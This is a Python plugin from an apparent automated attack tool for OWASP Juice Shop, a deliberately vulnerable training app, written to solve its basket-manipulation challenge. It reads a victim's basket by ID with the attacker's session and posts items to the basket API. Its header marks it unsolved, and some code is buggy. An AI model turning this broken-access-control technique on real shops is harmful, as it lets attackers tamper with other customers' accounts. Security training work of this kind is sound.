# SOURCE FILE:    basket.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve MANIPULATE BASKET Challenge
#                 Eg: using user A's credentials to view or manipulate on user B's basket
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang, Hugh Song
#
# NOTES
#   Not sovled yet
#   Python's json library allows duplicate keys, which means that no error will be reported when 
#   a duplicate key is present; however, all duplicate item will eventually ignore and only keep the last key
#--------------------------------------------------------------------------------------

import time
from plugins import attack as a
from plugins import login as usrLogin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import random

#---------------------------------------------------------------------------------------
#Class: manipulate_basket
#Inherit: Attack
#----------------------------------------------------------------------------------------
class manipulate_basket(a.attack_inter):
#-----------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables
#-----------------------------------------------------------------------------------------------
    def __init__(self):
        self.juice_session = a.requests.session()
        print("please enter attacker's email")
        email = input()
        print("please enter victim's email")
        victimEmail = input()
        self.email = email
        self.victimEmail = victimEmail
        self.basketId = a.get_basket_id(self.email)
        self.victimBid = a.get_basket_id(self.victimEmail)
        self.cookie, self.header = a.get_auth(self.email)
        self.productId = self.generate_productID(self.basketId)

#-----------------------------------------
#FUNCTION view_basket
#ARGUMENTS: basektId --> user's basekt Id
#RETURNS: productIds --> list store all items in the basket
#Description: This function is used to get all items in the basket
#             
#NOTES:
#-----------------------------------------------------------------------------------------------
    def view_basket(self, basektId):
        print('-----------------------------------------------------')
        print("Let us view user {} with  basket id {} --------------".format(self.email, basektId))
        try:
            productIds = []
            url = a.URL + '/rest/basket/' + str(basektId)
            response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
            print(response.text)
            products = response.json()["data"]["Products"]
            for i in range( len(products) ):
                item = products[i]
                productIds.append( item['id'] )
            print(productIds)
            return productIds
        except:
            print("cannot find basket")

#-----------------------------------------
#FUNCTION check_productId
#ARGUMENTS: basektId --> user's basekt Id
#           productId --> product id
#RETURNS: Boolean
#Description: check whether the product id already exist in the user's basekt
#             
#NOTES:
#-----------------------------------------------------------------------------------------------
    def check_productId(self, basekId, productId):
        return productId in self.view_basket(basekId)

#-----------------------------------------
#FUNCTION generate_productID
#ARGUMENTS: basektId --> user's basekt Id
#       
#RETURNS: pId
#Description: 1. Randomly generate a product ID
#             2. check whether the product id already exist in the user's basekt
#             3. if not exist return produck ID 
#             
#NOTES:
#-----------------------------------------------------------------------------------------------
    def generate_productID(self, basketId):
        pId = random.randint(1,20)
        count = 0
        while self.check_productId(basketId, pId):
            if count > 10:
                return None
            pId = random.randint
            count += 1
        return pId

#-----------------------------------------
#FUNCTION addto_basket
#ARGUMENTS: quantity --> number of products
#           productId --> product id
#       
#RETURNS: N/A
#Description: 1. Craft json data to add duplicate basketid(first one is belong to user A, second one is for user B)
#             2. Send POST request
#             
#NOTES:
#-----------------------------------------------------------------------------------------------
    def addto_basket(self, quantity, productId):
        print('---------------------------------------------------')
        print("Let us add to basket ID {} ----------------".format(self.basketId))
        try:
            print("we will add product Id {} ".format(productId))
            json = {
                "ProductId": productId,
                "BasketId": self.basketId,
                #"BasketId": "15",
                "quantity": quantity
            }
            url =a.URL + '/api/BasketItems/'
            response = self.juice_session.post(url, cookies=self.cookie, headers=self.header, json = json
                                               , verify= False)
            print(response.text)
            self.view_basket(self.basketId)
        except:
            print("2")

    def generator(self):
        pass

#-----------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for the plugin
#             
#NOTES: None
#-----------------------------------------------------------------------------------------------
    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log',
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("Manipulate Basket")
        a.logging.info(logger)
        a.logging.info('Started')
        self.view_basket(self.victimBid)
        self.addto_basket(quantity=1, productId=self.productId)
        a.logging.info('Finished')




